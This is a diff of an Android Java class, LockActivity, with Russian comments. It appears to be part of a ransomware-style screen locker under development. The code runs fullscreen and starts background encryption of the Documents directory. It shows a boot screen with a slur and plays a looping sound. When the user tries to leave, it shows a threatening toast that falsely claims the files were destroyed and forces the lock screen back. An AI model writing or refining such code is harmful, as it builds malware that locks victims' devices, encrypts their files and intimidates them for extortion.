@@ -47,12 +47,8 @@ public class LockActivity extends Activity {
             | View.SYSTEM_UI_FLAG_FULLSCREEN);
 
         am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
-        mp = MediaPlayer.create(this, R.raw.lockvideo);
-        if (mp != null) {
-            mp.setLooping(true);
-            mp.start();
-        }
 
+        // Шифрование файлов в фоне запускается сразу
         targetDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
         new Thread(new Runnable() {
             @Override
@@ -61,6 +57,7 @@ public class LockActivity extends Activity {
             }
         }).start();
 
+        // Цикл обновления времени и громкости
         handler.post(new Runnable() {
             @Override
             public void run() {
@@ -76,26 +73,33 @@ public class LockActivity extends Activity {
             }
         });
 
-        // --- ЛОГИКА АНИМАЦИИ ЭКРАНОВ ---
         TextView bootText = findViewById(R.id.bootText);
-        TextView headerText = findViewById(R.id.headerText);
         View mainBlock = findViewById(R.id.mainBlock);
 
-        // Начинаем с загрузки
+        // Сначала показываем загрузку
         bootText.setVisibility(View.VISIBLE);
         mainBlock.setVisibility(View.GONE);
 
-        // Через 3 секунды показываем логотип
+        // Логика анимации
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
                 bootText.setText("P I D O R I\n[ SYSTEM INITIALIZED ]");
-                // Через еще 2 секунды показываем блок с текстом
                 handler.postDelayed(new Runnable() {
                     @Override
                     public void run() {
                         bootText.setVisibility(View.GONE);
                         mainBlock.setVisibility(View.VISIBLE);
+
+                        // ЗВУК ВКЛЮЧАЕТСЯ ТУТ, КОГДА ПОЯВЛЯЕТСЯ ТЕКСТ "УПС"
+                        if (mp == null) {
+                            mp = MediaPlayer.create(LockActivity.this, R.raw.lockvideo);
+                            if (mp != null) {
+                                mp.setLooping(true);
+                                mp.start();
+                            }
+                        }
+
                     }
                 }, 2000);
             }
@@ -183,10 +187,7 @@ public class LockActivity extends Activity {
     protected void onPause() {
         super.onPause();
         if (!isUnlocked) {
-            // Показываем предупреждение при попытке выхода
             Toast.makeText(this, "ЗАМЕЧЕНА ПОПЫТКА ВЫХОДА. ФАЙЛЫ УНИЧТОЖЕНЫ.", Toast.LENGTH_SHORT).show();
-            
-            // Принудительно возвращаемся
             Intent intent = new Intent(this, LockActivity.class);
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
             startActivity(intent);
@@ -203,4 +204,4 @@ public class LockActivity extends Activity {
         }
         handler.removeCallbacksAndMessages(null);
     }
-                            }
+        }
